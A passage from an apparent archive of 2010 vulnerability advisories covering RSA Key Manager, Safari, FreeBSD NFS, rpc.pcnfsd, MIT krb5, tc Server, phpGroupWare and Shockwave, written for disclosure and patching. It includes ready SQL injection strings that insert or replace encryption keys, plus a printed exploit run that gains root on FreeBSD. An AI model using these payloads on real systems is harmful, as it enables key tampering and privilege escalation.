> An attacker can attempt to modify the cache to insert an arbitrary encryption key that may lead to data unavailability (such as decryption failure of data encrypted by that modified key).
>
> There is no impact on confidentiality of the data as the attacker would need the cache encryption key in order to decrypt the data.
>
> As of the date of this posting, RSA is not aware of any instances where this vulnerability may have been compromised nor are there signs of published exploit code.
>
> Recommendations
>
> RSA, The Security Division of EMC, recommends all customers upgrade to the latest version of RKM C Client and RKM Server/Appliance.
>
>
>
> EMC Product Security Response Center
> Email: security_alert emc com

_________________________________________________________________
The New Busy is not the too busy. Combine all your e-mail accounts with Hotmail.
http://www.windowslive.com/campaign/thenewbusy?tile=multiaccount&ocid=PID28326::T:WLMTAGL:ON:WL:en-US:WM_HMP:042010_4"
15137,tool: ref_fuzz (CVE-2010-1259 / MS10-035 and more),,CVE-2010-1259,"Originally developed in 2008, crashed every browser on the market back then:
http://lcamtuf.blogspot.com/2010/06/announcing-reffuzz-2yo-fuzzer.html
The release of MS10-035 probably fixes the last of the known
exploitable issues it triggered.
/mz"
15155,VUPEN Security Research - Apple Safari WebKit HTML Button Use-after-free Vulnerability (CVE-2010-1392),,CVE-2010-1392,"VUPEN Security Research - Apple Safari WebKit HTML Button Use-after-free Vulnerability (CVE-2010-1392)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Safari is a web browser developed by Apple. As of February 2010,
Safari was the fourth most widely used browser, with 4.45% of the
worldwide usage share of web browsers according to Net Application.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a vulnerability in
Apple Safari for Windows, Mac OS X and iPhone.
The flaw is caused due to a use-after-free error in WebKit when
rendering HTML buttons, which could be exploited by attackers to
execute arbitrary code via a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Apple Safari version 4.0.5 and prior
(Mac OS X v10.4.11, Mac OS X Server v10.4.11, Mac OS X v10.5.8,
Mac OS X Server v10.5.8, Mac OS X v10.6.2 or later, Mac OS X Server
v10.6.2 and later, Windows 7, Vista, XP SP2 and later, iPhone)
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
have been published by VUPEN through the VUPEN Binary Analysis & Exploits
portal :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Upgrade to Apple Safari version 5.0 or 4.1 :
http://www.apple.com/safari/download/
VI. CREDIT
--------------
The vulnerability was discovered by Matthieu Bonetti of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1373
http://support.apple.com/kb/HT4196
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1392
IX. DISCLOSURE TIMELINE
-----------------------------
2010-03-30 - Vendor notified
2010-03-30 - Vendor response
2010-05-07 - Status update received
2010-06-02 - Status update received
2010-06-08 - Coordinated public Disclosure"
15170,Re: RSA Key Manager SQL injection Vulnerability ( CVE-2010-1904 ),,CVE-2010-1904,"What is the issue?
This message is in response to the original message posted on June 3, 2010 addressing a SQL Injection vulnerability in the RSA Key Manager C Client version 1.5. The original message referenced CVE-2010-1904.
A vulnerability has been identified in the RSA Key Manager (RKM) C client 1.5 that may expose the product to a SQL Injection attack. An attacker having access to encrypted data may be able to leverage this vulnerability in an attempt to alter the RKM C Client 1.5 cache.
Affected Products:
RKM C Client versions 1.5.x.x, all platforms (Windows, Linux, Solaris, HP-UX, etc).
Unaffected Products:
RKM C Client 2.0.x, all platforms
RKM C Client 2.1.x, all platforms
RKM C Client 2.2.x, all platforms
RKM C Client 2.5.x, all platforms
RKM C Client 2.7, all platforms
All versions of RKM Java Client
RKM PKCS#11 Module for LT0-4
RKM PKCS#11 Module for Oracle TDE
RKM Server, all versions and platforms
RKM Appliance, all versions
Customer using EMC PowerPath with RSA encryption
Customer using Brocade Encryption Switches with RSA encryption
What is the impact?
An attacker can attempt to modify the cache to insert an arbitrary encryption key that may lead to data unavailability (such as decryption failure of data encrypted by that modified key).
There is no impact on confidentiality of the data as the attacker would need the cache encryption key in order to decrypt the data.
As of the date of this posting, RSA is not aware of any instances where this vulnerability may have been compromised nor are there signs of published exploit code.
Recommendations
RSA, The Security Division of EMC, recommends all customers upgrade to the latest version of RKM C Client and RKM Server/Appliance.
EMC Product Security Response Center
Email: security_alert emc com"
15181,RSA Key Manager SQL injection Vulnerability ( CVE-2010-1904 ),,CVE-2010-1904,"Product: RSA Key Manager
Vendor: EMC/RSA
Vulnerable Component: Key Manager Client
Vulnerable Component Version: 1.5.x
Vulnerability Type: SQL injection
Vendor Contact Date: 4/20/2010
Status: Vendor does not want to fix the vulnerability.
Vulnerability Details:
RSA Key Manager Client software uses an SQLite database to cache its encryption keys. The software fails to properly validate the metadata embedded inside of the RSA Key Manager encrypted data when it perform a key lookup when the encrypted data is being decrypted.An attacker can inject SQL commands into the metadata section of the RSA Key Manager encrypted data, which will be executed by the Key Manager Client software. For example, an attacker can inject SQL statements to modify existing encryption keys, remove existing encryption keys, add new encryption keys, etc.
The Key Manager client uses two types of cache: memory cache and file cache. As long as both or either of the caches are enabled the problem can be triggered easily. 
RSA Key Manager Client 1.5.x uses the following format when it encrypts data:
Field 1 = KeyIdStringField 2 = NULL TerminatorField 3 = Encryption IVField 4 = Encrypted Data
Encryptionn Key Cache tables:
1. ""ClassTable"" [contains encryption key classes configured on the server]
classID     VARCHAR(255) PRIMARY KEYkeyID       VARCHAR(255) [current key id for this key class]refreshTime INT UNSIGNEDupdateTime  INT UNSIGNED
2. ""ConfigTable"" [includes kekhash - KEK, Key Encryption Key, hash]
name VARCHAR(255) PRIMARY KEYvalue VARCHAR(255)
3. ""KeyTable"" [holds the cached encryption keys]
keyID       VARCHAR(255) PRIMARY KEYclassID     VARCHAR(255)keyData     BLOBalgorithm   VARCHAR(255) [usually ""AES/CBC""]refreshTime INT UNSIGNEDupdateTime  INT UNSIGNED
Sample Injections:
Injecting the following sql code results in a new encryption key in the Key Manager (client).
""; INSERT INTO KeyTable VALUES('1111','MyClass','MyKeyData','ABC',1000,2000);--
Injecting something like the sql code below can be used to replace the encryption keys used by Key Manager.
""; UPDATE KeyTable SET keyData ='NewKeyData' WHERE classID='MyClass';--

_________________________________________________________________
Hotmail is redefining busy with tools for the New Busy. Get more from your inbox.
http://www.windowslive.com/campaign/thenewbusy?ocid=PID28326::T:WLMTAGL:ON:WL:en-US:WM_HMP:042010_2"
15243,CVE-2010-2020: FreeBSD kernel NFS client local vulnerabilities,,CVE-2010-2020,"Census ID: census-2010-0001
URL:
http://census-labs.com/news/2010/05/26/freebsd-kernel-nfsclient/
CVE ID: CVE-2010-2020
Affected Products: FreeBSD 8.0-RELEASE, 7.3-RELEASE, 7.2-RELEASE
Class: Improper Input Validation (CWE-20)
Remote: No
Discovered by: Patroklos Argyroudis
We have discovered two improper input validation vulnerabilities in the
FreeBSD kernel's NFS client-side implementation (FreeBSD 8.0-RELEASE,
7.3-RELEASE and 7.2-RELEASE) that allow local unprivileged users to
escalate their privileges, or to crash the system by performing a denial
of service attack.
Details
FreeBSD (http://www.freebsd.org/) is an advanced operating system which
focuses on reliability and performance. More information about its
features can be found at http://www.freebsd.org/about.html.
FreeBSD 8.0-RELEASE, 7.3-RELEASE and 7.2-RELEASE employ an improper input
validation method in the kernel's NFS client-side implementation.
Specifically, the first vulnerability is in function nfs_mount() (file
src/sys/nfsclient/nfs_vfsops.c) which is reachable from the mount(2) and
nmount(2) system calls. In order for them to be enabled for unprivileged
users the sysctl(8) variable vfs.usermount must be set to a non-zero
value.
The function nfs_mount() employs an insufficient input validation method
for copying data passed in a structure of type nfs_args from userspace to
kernel. Specifically, the file handle buffer to be mounted (args.fh) and
its size (args.fhsize) are completely user-controllable. The unbounded copy
operation is in file src/sys/nfsclient/nfs_vfsops.c (the excerpts are from
8.0-RELEASE):
1094: if (!has_fh_opt) {
1095: error = copyin((caddr_t)args.fh, (caddr_t)nfh,
1096: args.fhsize);
1097: if (error) {
1098: goto out;
1099: }
The declaration of the variables args and nfh is at:
786: static int
787: nfs_mount(struct mount *mp)
788: {
789: struct nfs_args args = {
790: .version = NFS_ARGSVERSION,
...
820: u_char nfh[NFSX_V3FHMAX];
This vulnerability can cause a kernel stack overflow which leads to
privilege escalation on FreeBSD 7.3-RELEASE and 7.2-RELEASE. On FreeBSD
8.0-RELEASE the result is a kernel crash/denial of service due to the
SSP/ProPolice kernel stack-smashing protection which is enabled by
default. Versions 7.1-RELEASE and earlier do not appear to be
vulnerable since the bug was introduced in 7.2-RELEASE. In order to
demonstrate the impact of the vulnerability we have developed a
proof-of-concept privilege escalation exploit:
http://census-labs.com/media/nfs_mount_ex.c
A sample run of the exploit follows:
[argp@julius ~]$ uname -rsi
FreeBSD 7.3-RELEASE GENERIC
[argp@julius ~]$ sysctl vfs.usermount
vfs.usermount: 1
[argp@julius ~]$ id
uid=1001(argp) gid=1001(argp) groups=1001(argp)
[argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex
[argp@julius ~]$ ./nfs_mount_ex
[*] calling nmount()
[!] nmount error: -1030740736
nmount: Unknown error: -1030740736
[argp@julius ~]$ id
uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
The second vulnerability exists in the function mountnfs() that is called
from function nfs_mount():
1119: error = mountnfs(&args, mp, nam, args.hostname, &vp,
1120: curthread->td_ucred);
The function mountnfs() is reachable from the mount(2) and nmount(2) system
calls by unprivileged users. As with the nfs_mount() case above, this
requires the sysctl(8) variable vfs.usermount to be set to a non-zero value.
The file handle to be mounted (argp->fh) and its size (argp->fhsize)
are passed to function mountnfs() from function nfs_mount() and are
user-controllable. These are subsequently used in an unbounded bcopy()
call (file src/sys/nfsclient/nfs_vfsops.c):
1219: bcopy((caddr_t)argp->fh, (caddr_t)nmp->nm_fh, argp->fhsize);
The above can cause a kernel heap overflow when argp->fh is bigger than 128
bytes (the size of nmp->nm_fh) since nmp is an allocated item on the
Universal Memory Allocator (UMA, the FreeBSD kernel's heap allocator)
zone nfsmount_zone (again from src/sys/nfsclient/nfs_vfsops.c):
1160: static int
1161: mountnfs(struct nfs_args *argp, struct mount *mp, struct sockaddr *nam,
1162: char *hst, struct vnode **vpp, struct ucred *cred)
1163: {
1164: struct nfsmount *nmp;
1165: struct nfsnode *np;
1166: int error;
1167: struct vattr attrs;
1168:
1169: if (mp->mnt_flag &MNT_UPDATE) {
1170: nmp = VFSTONFS(mp);
1171: printf(""%s: MNT_UPDATE is no longer handled here "",
__func__);
1172: free(nam, M_SONAME);
1173: return (0);
1174: } else {
1175: nmp = uma_zalloc(nfsmount_zone, M_WAITOK);
This kernel heap overflow can lead on FreeBSD 8.0-RELEASE, 7.3-RELEASE and
7.2-RELEASE to privilege escalation and/or a kernel crash/denial of
service attack. Similarly to the first vulnerability, FreeBSD 7.1-RELEASE
and earlier versions do not appear to be vulnerable. We have developed a
proof-of-concept DoS exploit to demonstrate the vulnerability:
http://census-labs.com/media/mountnfsex.c
Furthermore, we have also developed a privilege escalation exploit for this
second vulnerability which will not be released at this point.
FreeBSD has released an official advisory and a patch to address both
vulnerabilities:
http://security.freebsd.org/advisories/FreeBSD-SA-10:06.nfsclient.asc
All affected parties are advised to follow the upgrade instructions
included in the advisory and patch their systems.
--
Patroklos Argyroudis
http://www.census-labs.com/"
15309,"HP-UX, IBM AIX, SGI IRIX Remote Vulnerability - CVE-2010-1039",,CVE-2010-1039,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
rpc.pcnfsd syslog format string vulnerability
CVE-2010-1039
INTRODUCTION
There exists a vulnerability within a log function of the rpc.pcnfsd service
which when properly exploited can lead to remote compromise of the vulnerable
system.
This vulnerability was confirmed in the following versions and operating
systems, other versions and operating systems may be also affected.
IBM AIX 6.1.0 and lower
IRIX 6.5
HP-UX 11.11, 11.23, 11.31
DETAILS
This vulnerability can be triggered by sending a rpc request resulting in an
invalid directory causing the service to call _msgout() function that call
syslog() function to log the error without checking for formatted strings.
This is the vulnerable function (pcnfsd version 1.2 source).
from pcnfsd_print.c
psrstat pr_start2(system, pr, user, fname, opts, id)
...
...
if (rename(pathname, new_pathname))
{
/*
**---------------------------------------------------------------
** Should never happen.
**---------------------------------------------------------------
*/
(void)sprintf(tempstr, ""rpc.pcnfsd: spool file rename (%s->%s) failed. "",
pathname, new_pathname);
msg_out(tempstr); <---- Vuln Function with our input
form pcnfsd_xdr.c
static
_msgout(msg)
char *msg;
{
#ifdef RPC_SVC_FG
if (_rpcpmstart)
syslog(LOG_ERR, msg); <---- Problem here!
else
(void) fprintf(stderr, ""%s "", msg);
#else
syslog(LOG_ERR, msg); <---- Problem here!
#endif
return(0);
}
GDB output:
Program received signal SIGSEGV, Segmentation fault.
0xd01e28cc in _doprnt () from /usr/lib/libc.a(shr.o)
(gdb) bt
#0 0xd01e28cc in _doprnt () from /usr/lib/libc.a(shr.o)
#1 0xd01dd4fc in vfprintf () from /usr/lib/libc.a(shr.o)
#2 0xd024be10 in __syslog_r () from /usr/lib/libc.a(shr.o)
#3 0xd024c400 in syslog () from /usr/lib/libc.a(shr.o)
#4 0x10000d98 in ?? ()
CREDITS
This vulnerability was discovered and exploited by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
15341,MITKRB5-SA-2010-005 [CVE-2010-1321] GSS-API lib null pointer deref,,CVE-2010-1321,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-005
MIT krb5 Security Advisory 2010-005
Original release: 2010-05-18
Topic: GSS-API library null pointer dereference
CVE-2010-1321
CVSSv2 Vector: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 6.8
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 5.3
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
Certain invalid GSS-API tokens can cause a GSS-API acceptor (server)
to crash due to a null pointer dereference in the GSS-API library.
This is an implementation vulnerability in MIT krb5, and not a
vulnerability in the Kerberos protocol.
IMPACT
======
An authenticated remote attacker can cause a GSS-API application
server (including the Kerberos administration daemon kadmind) to crash
by sending a malformed GSS-API token that induces a null pointer
dereference.
AFFECTED SOFTWARE
=================
* kadmind and other GSS-API server applications in all known releases
of MIT krb5, up to and including krb5-1.8.1
* third-party GSS-API server applications that link link against the
GSS-API library in all known releases of MIT krb5, up to and
including krb5-1.8.1
* Independent implementations of the krb5 GSS-API mechanism may be
vulnerable, as the underlying bug is based on plausible (but
invalid) assumptions about the Kerberos protocol.
FIXES
=====
* The upcoming krb5-1.8.2 release and an upcoming krb5-1.7 series
release will contain a fix for this vulnerability.
* Apply the following patch. The patch was generated against
krb5-1.8.1, but should also apply to krb5-1.7 series releases.
diff --git a/src/lib/gssapi/krb5/accept_sec_context.c b/src/lib/gssapi/krb5/accept_sec_context.c
index ce3075f..6241055 100644
- --- a/src/lib/gssapi/krb5/accept_sec_context.c
+++ b/src/lib/gssapi/krb5/accept_sec_context.c
@@ -607,6 +607,13 @@ kg_accept_krb5(minor_status, context_handle,
}
#endif
+ if (authdat->checksum == NULL) {
+ /* missing checksum counts as ""inappropriate type"" */
+ code = KRB5KRB_AP_ERR_INAPP_CKSUM;
+ major_status = GSS_S_FAILURE;
+ goto fail;
+ }
+
if (authdat->checksum->checksum_type != CKSUMTYPE_KG_CB) {
/* Samba does not send 0x8003 GSS-API checksums */
krb5_boolean valid;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2010-005-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-005-patch.txt.asc
For the krb5-1.6 release:
http://web.mit.edu/kerberos/advisories/2010-005-patch_r16.txt
PGP-signed patch for krb5-1.6:
http://web.mit.edu/kerberos/advisories/2010-005-patch_r16.txt.asc
Earlier releases may require minor porting.
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-005.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-1321
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1321
ACKNOWLEDGMENTS
===============
Thanks to Shawn Emery (Oracle) for reporting this vulnerability.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The krb5 GSS-API mechanism specification requires that the checksum
field in the authenticator of the Kerberos AP-REQ (which is optional
in the base Kerberos protocol) be present and contain specific
contents. If the checksum field is missing, the decoded structure
contains a null pointer, which code called through
krb5_gss_accept_sec_context() dereferences without first checking for
a null pointer.
Independent implementations of the krb5 GSS-API mechanism may be
vulnerable because a developer might reasonably make the invalid
assumption that the authenticator checksum field is not empty (and
hence, that the C representation would not contain a null pointer).
REVISION HISTORY
================
2010-05-18 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkvy1ooACgkQSO8fWy4vZo4u8gCgz7jbjv/wCB4gvphXuK8x1g1f
+PMAoKOiUzAEan9RPXQ4MN4SJ2Cl1Zl8
=wuxV
-----END PGP SIGNATURE-----"
15359,CVE-2010-1454: SpringSource tc Server unauthenticated remote access to JMX interface,,CVE-2010-1454,"CVE-2010-1454: SpringSource tc Server unauthenticated remote access to JMX interface
Severity: Critical
Vendor:
SpringSource, a division of VMware
Versions Affected:
tc Server Runtime 6.0.19.A, 6.0.20.A, 6.0.20.B, 6.0.20.C, 6.0.25.A
Description:
A problem has been identified in the com.springsource.tcserver.serviceability.rmi.JmxSocketListener. If the listener is configured to use an encrypted password ( i.e. the password is prefaced with s2enc:// ) then entering either the correct password or an empty string will allow authenticated access to the JMX interface. The JMX interface is not remotely accessible by default but may be configured for remote access by setting the address attribute.
Mitigation:
All users are recommended to immediately switch to non-encrypted passwords for the JMX interface or to disable the JMX interface.
Users wishing to continue to use the JMX interface with encrypted passwords should upgrade the tc Server Runtime to 6.0.20.D or 6.0.25.A-SR01 (included in tc Server 2.0.0.SR01) available from the SpringSource support portal (for customers with support contracts) or the SpringSource download centre.
Credit:
This vulnerability was discovered by Erhan Baz at Yapi Kredi.
References:
[1] http://www.springsource.com/security/tc-server
Mark Thomas
SpringSource Security Team"
15369,phpGroupWare SQL Injections and Local File Inclusion Vulnerabilities (CVE-2010-0403 and CVE-2010-0404),,CVE-2010-0403,"I. BACKGROUND
---------------------
""phpGroupWare is a fully featured, web based messaging, collaboration and
enterprise management platform. phpGroupWare comes with over 50 applications
that can be mixed and matched according to your needs. Around the world tens
of thousands of people use phpGroupWare every day."" from phpgroupware.org
II. VULNERABILITIES
----------------------------
VUPEN Web Vulnerability Research Team discovered multiple vulnerabilities in
phpGroupWare.
SQL Injections: Multiple input validation errors exist in the
""class.sessions_db.inc.php"", ""class.translation_sql.inc.php"",
""class.sessions_db.inc.php"" and ""class.auth_sql.inc.php"" scripts within
the ""phpgwapi/inc/"" folder, which could allow SQL injection attacks.
Local File Inclusion: An input validation error exists in the ""about.php""
script when processing the ""app"" parameter, which could allow remote attackers
to include local files with the privileges of the web server.
III. AFFECTED PRODUCTS
--------------------------------
phpGroupWare version 0.9.16.015 and prior
IV. SOLUTION
------------------
Upgrade to phpGroupWare version 0.9.16.016
V. CREDIT
--------------
These vulnerabilities were discovered by VUPEN Security
VI. VUPEN Web Application Security Scanner (WASS)
------------------------------------------------------------
VUPEN Web Application Security Scanner (WASS) is a SaaS web app. security
scanning technology which enables corporations and organizations to identify,
track and remediate security vulnerabilities affecting their web sites and
web applications, prevent criminals from gaining unauthorized access to
sensitive data, and comply with security requirements such as PCI.
VUPEN WASS is based on a proprietary technology developed by VUPEN security
experts, and combines black-box (smart and automated) and grey-box
(signature-based) scanning to accurately identify web vulnerabilities such
as those in the OWASP Top 10 including SQL injection and cross-site scripting,
but also real-world vulnerabilities such as shell command injection and
file inclusion.
Read More: http://www.vupen.com/english/wass/
VII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1145
http://forums.phpgroupware.org/index.php?t=msg&th=98662&start=0&rid=0
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0403
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0403
VIII. DISCLOSURE TIMELINE
------------------------------------
2010-04-14 - Vendor notified
2010-04-21 - Vendor response
2010-05-14 - Coordinated public Disclosure"
15395,VUPEN Security Research - Adobe Shockwave 3D Blocks Field Code Execution Vulnerability (CVE-2010-1283),,CVE-2010-1283,"VUPEN Security Research - Adobe Shockwave 0xFFFFFF49 3D Block Code Execution Vulnerability (CVE-2010-1283)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Over 450 million Internet-enabled desktops have installed Adobe Shockwave
Player. These people now have access to some of the best the Web has to offer
including dazzling 3D games and entertainment, interactive product
demonstrations, and online learning applications. Shockwave Player displays
Web content that has been created by Adobe Director."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
Adobe Shockwave Player.
This vulnerability is caused due to a memory corruption error when processing
0xFFFFFF49 3D blocks within Director files, which could be exploited by attackers
to execute arbitrary code by tricking a user into visiting a specially crafted
web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Shockwave Player versions prior to 11.5.7.609
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Adobe Shockwave Player version 11.5.7.609
VI. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1128
http://www.adobe.com/support/security/bulletins/apsb10-12.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1283
IX. DISCLOSURE TIMELINE
-----------------------------
2010-02-24 - Vendor notified
2010-02-24 - Vendor response
2010-03-02 - Status update received
2010-05-07 - Status update received
2010-05-12 - Coordinated public Disclosure"
15396,VUPEN Security Research - Adobe Shockwave DIRAPI Multiple Code Execution Vulnerabilities (CVE-2010-1280),,CVE-2010-1280,"VUPEN Security Research - Adobe Shockwave DIRAPI Multiple Code Execution Vulnerabilities (CVE-2010-1280)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Over 450 million Internet-enabled desktops have installed Adobe Shockwave
Player. These people now have access to some of the best the Web has to offer
including dazzling 3D games and entertainment, interactive product
demonstrations, and online learning applications. Shockwave Player displays
Web content that has been created by Adobe Director."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered seven critical vulnerabilities
in Adobe Shockwave Player.
These vulnerabilities are caused due to memory corruptions, array indexing,
heap overflows and invalid pointers when processing malformed files, which
could be exploited by attackers to execute arbitrary code by tricking a user
into visiting a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Shockwave Player versions prior to 11.5.7.609
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Adobe Shockwave Player version 11.5.7.609
VI. CREDIT
--------------
Discovered by Chaouki Bekrar and Sebastien Renaud of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1128
http://www.adobe.com/support/security/bulletins/apsb10-12.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1280
IX. DISCLOSURE TIMELINE
-----------------------------
2010-02-24 - Vendor notified
2010-02-24 - Vendor response
2010-03-02 - Status update received
2010-05-07 - Status update received
2010-05-12 - Coordinated public Disclosure"
15397,VUPEN Security Research - Adobe Shockwave 3D Two Remote Code Execution Vulnerabilities (CVE-2010-1284),,CVE-2010-1284,"VUPEN Security Research - Adobe Shockwave 3D Two Code Execution Vulnerabilities (CVE-2010-1284)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Over 450 million Internet-enabled desktops have installed Adobe Shockwave
Player. These people now have access to some of the best the Web has to offer
including dazzling 3D games and entertainment, interactive product
demonstrations, and online learning applications. Shockwave Player displays
Web content that has been created by Adobe Director."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered two critical vulnerabilities
in Adobe Shockwave Player.
These vulnerabilities are caused due to memory corruption errors when
processing malformed 3D Director files, which could be exploited by attackers
to execute arbitrary code by tricking a user into visiting a specially crafted
web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Shockwave Player versions prior to 11.5.7.609
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Adobe Shockwave Player version 11.5.7.609
VI. CREDIT
--------------
These vulnerabilities were discovered by Chaouki Bekrar of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1128
http://www.adobe.com/support/security/bulletins/apsb10-12.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1284
IX. DISCLOSURE TIMELINE
-----------------------------
2010-02-24 - Vendor notified
2010-02-24 - Vendor response
2010-03-02 - Status update received
2010-05-07 - Status update received
2010-05-12 - Coordinated public Disclosure"
15398,VUPEN Security Research - Adobe Shockwave IML32 Multiple Code Execution Vulnerabilities (CVE-2010-0129),,CVE-2010-0129,"VUPEN Security Research - Adobe Shockwave IML32 Multiple Code Execution Vulnerabilities (CVE-2010-0129)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Over 450 million Internet-enabled desktops have installed Adobe Shockwave
Player. These people now have access to some of the best the Web has to offer
including dazzling 3D games and entertainment, interactive product
demonstrations, and online learning applications. Shockwave Player displays
Web content that has been created by Adobe Director."" from Adobe.com
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered eleven critical vulnerabilities
in Adobe Shockwave Player.
These vulnerabilities are caused due to integer overflows, array indexing,
and memory corruption errors when processing malformed Shockwave or Director
files, which could be exploited by attackers to execute arbitrary code by
tricking a user into visiting a specially crafted web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Shockwave Player versions prior to 11.5.7.609
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis, code execution exploits and proof-of-concept
codes are published through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
V. SOLUTION
----------------
Adobe Shockwave Player version 11.5.7.609
VI. CREDIT
--------------
These vulnerabilities were discovered by Chaouki Bekrar of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
